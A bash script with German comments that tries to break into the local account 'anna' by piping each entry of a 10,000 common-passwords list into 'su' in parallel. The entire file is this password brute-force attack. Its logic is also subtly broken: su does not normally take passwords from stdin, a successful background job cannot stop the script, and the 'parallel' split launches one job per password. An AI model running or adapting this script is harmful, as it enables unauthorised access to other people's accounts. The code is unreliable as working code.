#!/bin/bash

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path="./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username="anna"

# Anzahl der Prozesse, die gleichzeitig gestartet werden sollen
num_processes=10

# Funktion, um Passwörter zu testen
check_password() {
    local password="$1"
    su - "$username" -c "whoami" <<< "$password" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
        exit 0
    fi
}

# Teile die Passwortliste in Unterlisten für jeden Prozess auf
split -n l/${num_processes} "$password_list_path" /tmp/password_list_

# Starte die Prozesse parallel
for sublist in /tmp/password_list_*; do
    while IFS= read -r password; do
        check_password "$password" &
    done < "$sublist"
done

# Warte auf die Beendigung aller Prozesse
wait

# Wenn kein gültiges Passwort gefunden wurde
echo "Kein gültiges Passwort für '$username' gefunden."
exit 1
